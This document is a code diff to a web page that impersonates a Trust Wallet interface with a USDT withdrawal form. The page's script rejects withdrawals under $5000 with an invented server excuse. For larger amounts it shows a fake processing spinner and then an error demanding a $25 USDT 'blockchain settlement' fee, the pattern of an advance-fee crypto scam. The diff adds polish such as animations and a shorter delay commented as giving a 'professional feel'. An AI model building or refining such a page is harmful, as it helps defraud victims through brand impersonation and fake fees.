@@ -113,12 +113,63 @@
       color: #555;
       line-height: 1.4;
     }
+
+    /* Spinner styling */
+    .spinner-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 60px;
+      margin-top: 12px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--primary);
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    /* Add soft fade in/out */
+    .fade {
+      animation: fadeIn 0.5s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0;}
+      to { opacity: 1;}
+    }
+
+    .withdraw-btn {
+      margin-top: 30px;
+      color: white;
+    }
+    .back-btn {
+      background: none;
+      color: var(--primary);
+      border: none;
+      padding: 0;
+      font-weight: bold;
+      text-decoration: underline;
+      margin-bottom: 15px;
+      cursor: pointer;
+      width: auto;
+      font-size: 15px;
+    }
+    .back-btn:hover {
+      color: var(--accent);
+    }
   </style>
 </head>
 <body>
 
   <!-- Welcome Screen -->
-  <div class="screen active" id="welcomeScreen">
+  <div class="screen active fade" id="welcomeScreen">
     <img src="IMG_3259.png" alt="Trust Wallet Logo" class="logo">
     <h2>Welcome Back</h2>
     <button onclick="openDashboard()">OPEN</button>
@@ -136,29 +187,61 @@
       <div class="crypto-item">ETH <span>$0.01</span></div>
       <div class="crypto-item">BNB <span>$0.00</span></div>
     </div>
-
-    <!-- Withdrawal Section -->
-    <h3 style="margin-top:30px; color: var(--primary);">Send USDT</h3>
-    <input type="text" id="walletAddress" placeholder="Enter wallet address">
-    <input type="number" id="withdrawAmount" placeholder="Enter withdrawal amount (USDT)">
-    <button onclick="processWithdrawal()">SEND</button>
-    <div class="message" id="message"></div>
-    <div class="notice"> Payment takes only <strong>9 seconds</strong> to reach your wallet.<br>
+    <button class="withdraw-btn" onclick="openWithdrawForm()">Send USDT</button>
+    <div class="notice">
+      Payment takes only <strong>9 seconds</strong> to reach your wallet.<br>
       A fee of <strong>$25 USDT</strong> is required for <em>BLOCKCHAIN SETTLEMENT</em> to ensure immediate and FINAL TRANSACTION RELEASE.
     </div>
   </div>
 
+  <!-- Withdrawal Form Screen -->
+  <div class="screen" id="withdrawScreen">
+    <button class="back-btn" onclick="backToDashboard()">&larr; Back</button>
+    <h2>Send USDT</h2>
+    <input type="text" id="walletAddress" placeholder="Enter wallet address">
+    <input type="number" id="withdrawAmount" placeholder="Enter withdrawal amount (USDT)">
+    <button onclick="processWithdrawal()">Confirm</button>
+    <div class="message" id="message"></div>
+    <div class="spinner-container" id="spinner" style="display:none;">
+      <div class="spinner"></div>
+    </div>
+  </div>
+
   <script>
+    function showScreen(id) {
+      // Hide all
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      // Show selected
+      const screen = document.getElementById(id);
+      screen.classList.add('active', 'fade');
+      setTimeout(() => screen.classList.remove('fade'), 500); // Soft fade in
+    }
+
     function openDashboard() {
-      document.getElementById("welcomeScreen").classList.remove("active");
-      document.getElementById("dashboardScreen").classList.add("active");
+      showScreen("dashboardScreen");
+    }
+
+    function openWithdrawForm() {
+      showScreen("withdrawScreen");
+      // Reset inputs and messages
+      document.getElementById("walletAddress").value = "";
+      document.getElementById("withdrawAmount").value = "";
+      document.getElementById("message").textContent = "";
+      document.getElementById("spinner").style.display = "none";
+    }
+
+    function backToDashboard() {
+      openDashboard();
     }
 
     function processWithdrawal() {
       const address = document.getElementById("walletAddress").value.trim();
       const amount = parseFloat(document.getElementById("withdrawAmount").value);
       const messageDiv = document.getElementById("message");
+      const spinnerDiv = document.getElementById("spinner");
+
       messageDiv.textContent = "";
+      spinnerDiv.style.display = "none";
 
       if (!address || isNaN(amount)) {
         messageDiv.textContent = "Please enter a valid wallet address and amount.";
@@ -166,16 +249,18 @@
       }
 
       if (amount < 5000) {
-        messageDiv.textContent = "Withdrawal canât process due to low volume demand in the server. Withdrawal amount should be above $5000.";
+        messageDiv.textContent = "Withdrawal can’t process due to low volume demand in the server. Withdrawal amount should be above $5000.";
         return;
       }
 
-      messageDiv.textContent = "Processing withdrawal...";
+      spinnerDiv.style.display = "flex";
+      messageDiv.textContent = "";
+
       setTimeout(() => {
+        spinnerDiv.style.display = "none";
         messageDiv.textContent = "Error: $25 USDT fee required for withdrawal processing to your address.";
-      }, 8000);
+      }, 2000); // 2 seconds for professional feel
     }
   </script>
-
 </body>
 </html>
